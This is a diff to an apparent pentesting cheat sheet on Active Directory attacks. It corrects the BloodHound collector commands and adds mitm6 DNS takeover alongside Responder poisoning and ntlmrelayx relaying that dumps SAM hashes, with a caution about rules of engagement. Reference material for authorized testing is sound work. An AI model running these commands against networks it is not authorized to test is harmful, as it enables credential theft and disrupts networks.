@@ -353,8 +353,10 @@ Active Directory — attack paths
 # Map the domain (`bhce` wraps the CE-ready collection):
 bhce <ip_address> <user> <password> <domain>
 nxc ldap <ip_address> -u <user> -p <password> --bloodhound --collection All --dns-server <ip_address>
-# bloodhound-python here is the CE collector from the `bloodhound-ce-python` pkg — NOT the legacy 'bloodhound.py':
-bloodhound-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
+# bloodhound-ce-python IS the CE collector (apt `bloodhound-ce-python`). The bare name
+# `bloodhound-python` is the LEGACY (≤4.3.1) binary from the 'bloodhound.py' pkg — its zips
+# do NOT ingest into CE, and there is no symlink between the two:
+bloodhound-ce-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
 # rusthound-ce is the fast ALTERNATE collector on a large domain — one static Rust binary,
 # no Python chain. UPSTREAM (`cargo install rusthound-ce`), not apt; complement, not replacement:
 rusthound-ce -d <domain> -u <user>@<domain> -p <password> --dc <ip_address> -z
@@ -409,6 +411,10 @@ Poisoning & relay — Responder / ntlmrelayx
 nxc smb <ip_address>/24 --gen-relay-list relaytargets.txt    # targets w/o SMB signing
 sudo responder -I <iface>                                    # poison LLMNR/NBT-NS/mDNS -> NetNTLMv2
 sudo responder -I <iface> --disable-ess --lm                 # downgrade to NetNTLMv1 (shuckable, next fold)
+sudo mitm6 -d <domain>                                       # IPv6/DNS takeover -> WPAD/HTTP auth; the trigger when LLMNR/NBT-NS is off but IPv6 isn't
+# mitm6 rewrites DNS for the WHOLE segment while it runs — loud, disruptive, and an ROE
+# conversation first. Pair it with ntlmrelayx below (-6 / --wh for the WPAD host), and keep
+# the run SHORT: everything on the segment is resolving through you until you stop it.
 # To RELAY not crack: set SMB=Off + HTTP=Off in Responder.conf (/etc/ or /usr/share/responder/) first, then:
 impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
 impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
